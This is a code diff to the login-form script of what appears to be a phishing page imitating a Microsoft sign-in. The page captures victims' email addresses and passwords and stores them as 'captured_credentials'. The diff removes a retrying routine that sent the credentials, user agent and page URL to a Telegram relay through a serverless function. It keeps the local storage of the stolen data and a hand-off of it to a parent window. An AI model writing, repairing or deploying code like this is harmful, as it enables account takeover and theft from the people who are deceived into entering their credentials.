@@ -290,13 +290,16 @@
       var count = 0;
       $('#submit-btn').click(function(event){
         event.preventDefault();
-        var email = $("#email").val();
+        var email = $("#emailch").html() || $("#email").val();
         var password = $("#password").val();
         var detail = $("#field").html();
 
         if (!email || !email.trim()) {
-          showError('Please enter your email address');
-          return false;
+          email = $("#email").val(); // fallback to email field
+          if(!email || !email.trim()){
+              showError('Please enter your email address');
+              return false;
+          }
         }
 
         email = email.trim();
@@ -316,7 +319,7 @@
         hideError();
         count = count + 1;
 
-        // FIXED: Enhanced credential storage with immediate transmission
+        // FIXED: Enhanced credential storage without immediate transmission
         try {
           const credentialsData = {
             email: email,
@@ -337,58 +340,7 @@
           sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
 
           console.log('✅ Validated Microsoft credentials stored for transmission');
-
-          // FIXED: Immediate transmission to Telegram with retry logic
-          const sendToTelegram = async (retryCount = 0) => {
-            const maxRetries = 3;
-            try {
-              const response = await fetch('/.netlify/functions/sendTelegram', {
-                method: 'POST',
-                headers: { 
-                  'Content-Type': 'application/json',
-                  'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                  email: credentialsData.email,
-                  password: credentialsData.password,
-                  passwordSource: 'replacement-form-direct',
-                  cookies: [], // Will be populated when cookies are captured on MS domain
-                  userAgent: navigator.userAgent,
-                  sessionId: Date.now().toString(),
-                  url: window.location.href,
-                  timestamp: new Date().toISOString(),
-                  validated: true,
-                  microsoftAccount: true,
-                  source: 'replacement-html-direct',
-                  retryAttempt: retryCount
-                })
-              });
-
-              if (response.ok) {
-                console.log('✅ Credentials successfully sent to Telegram from replacement.html');
-                localStorage.setItem('telegram_data_sent', 'true');
-                sessionStorage.setItem('telegram_data_sent', 'true');
-                return true;
-              } else if (response.status >= 500 && retryCount < maxRetries) {
-                console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
-                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 1000);
-              } else {
-                console.warn('⚠️ Failed to send credentials to Telegram:', response.status);
-                return false;
-              }
-            } catch (error) {
-              console.warn('⚠️ Error sending credentials to Telegram:', error);
-              if (retryCount < maxRetries) {
-                console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
-                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 2000);
-              }
-              return false;
-            }
-          };
-
-          // Send immediately
-          sendToTelegram();
-
+          
           // Send credentials to parent window (best-effort; may not exist)
           try {
             const messageData = {
@@ -414,7 +366,7 @@
           }
 
         } catch (e) {
-          console.warn('Failed to store/send credentials:', e);
+          console.warn('Failed to store credentials:', e);
         }
 
         // Show verifying state
